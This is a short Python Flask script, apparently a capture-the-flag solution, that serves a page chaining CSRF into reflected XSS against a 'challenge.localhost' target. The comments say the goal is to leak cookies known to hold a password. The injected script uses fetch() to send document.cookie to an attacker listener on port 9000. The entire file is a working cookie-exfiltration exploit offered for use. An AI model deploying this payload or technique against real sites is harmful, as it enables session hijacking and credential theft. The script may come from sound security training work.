from flask import Flask
import requests
# Now ussing csrf to perform XSS, we want to leak the cookies (which we happen to know
# contain the password). It gets convoluted because the payload has to contain a url
# making a get request to a listner we set-up, but the special characters need to
# be encoded but only once in the "correct" location
app = Flask(__name__)

@app.route("/")
def respond():
    url = "http://challenge.localhost/ephemeral"

    leak_url = "http://challenge.localhost:9000"
    form_html = f"""<script>
    let payload = "<script>fetch('{leak_url}?msg='+encodeURIComponent(document.cookie));</s"+"cript>";
    window.location.href="{url}?msg="+encodeURIComponent(payload);
    </script>
    """
    return form_html

app.run(debug=True, port=1337)
